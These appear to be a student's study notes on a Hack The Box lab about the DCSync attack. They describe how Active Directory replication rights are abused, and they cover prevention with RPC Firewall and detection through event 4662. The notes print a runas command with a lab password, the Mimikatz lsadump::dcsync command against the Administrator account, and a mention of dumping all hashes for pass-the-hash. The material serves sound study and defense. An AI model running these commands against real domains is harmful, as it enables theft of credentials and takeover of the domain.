# DCSync

---

## Description

`DCSync` is an attack that threat actors use to impersonate a Domain Controller and perform replication with a targeted Domain Controller to extract password hashes from Active Directory. The attack can be performed both from the perspective of a user account or a computer, as long as they have the necessary permissions assigned, which are:

- `Replicating Directory Changes`
- `Replicating Directory Changes All`

---

## Attack

We will utilize the user `Rocky` (whose password is `Slavi123`) to showcase the DCSync attack. When we check the permissions for Rocky, we see that he has `Replicating Directory Changes` and `Replicating Directory Changes All` assigned:

First, we need to start a new command shell running as Rocky:

```cmd
C:\Users\bob\Downloads> runas /user:eagle\rocky cmd.exe

Enter the password for eagle\rocky:
Attempting to start cmd.exe as user "eagle\rocky" ...
```

Subsequently, we need to use `Mimikatz`, one of the tools with an implementation for performing DCSync. We can run it by specifying the username whose password hash we want to obtain if the attack is successful, in this case, the user `Administrator`:

```cmd
C:\Mimikatz> mimikatz.exe

mimikatz # lsadump::dcsync /domain:eagle.local /user:Administrator

[DC] 'eagle.local' will be the domain
[DC] 'DC2.eagle.local' will be the DC server
[DC] 'Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

It is possible to specify the `/all` parameter instead of a specific username, which will dump the hashes of the entire AD environment. We can then perform pass-the-hash with the obtained hash and authenticate against any Domain Controller.

---

## Prevention

What `DCSync` abuses is a common operation in Active Directory environments, as replication occurs between Domain Controllers all the time; therefore, preventing DCSync out of the box is not an option. The only prevention technique against this attack is using solutions such as the `RPC Firewall`, a third-party product that can block or allow specific RPC calls with robust granularity. For example, using `RPC Firewall`, we can only allow replications from Domain Controllers.

---

## Detection

Detecting DCSync is easy because each Domain Controller replication generates an event with the ID `4662`. We can pick up abnormal requests immediately by monitoring for this event ID and checking whether the initiator account is a Domain Controller. Here is the event generated from earlier when we ran Mimikatz; it serves as a flag that a user account is performing this replication attempt:

![Security event log 4662 showing object access by 'rocky' on domain 'eagle.local', with control access properties listed.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/176/A5/DCSync4.png)

Since replication occurs constantly, we can avoid false positives by ensuring the following:

- Either the property `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` or `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` is present in the event.
- Whitelisting systems or accounts with a valid business reason for replicating, such as Azure AD Connect (this service constantly replicates Domain Controllers and sends the obtained password hashes to Azure AD).

## Summary

This section explains `DCSync`, a method used to impersonate a Domain Controller and replicate password hashes from Active Directory. It focuses on the Description, Attack, Prevention, and Detection sections.

## What I Did

I reviewed the Hack The Box material, followed the examples, and reviewed the tools and steps shown in this section.

## What I Learned

I learned how `DCSync` abuses legitimate replication permissions to extract password hashes and how monitoring replication events is key to identifying malicious use.
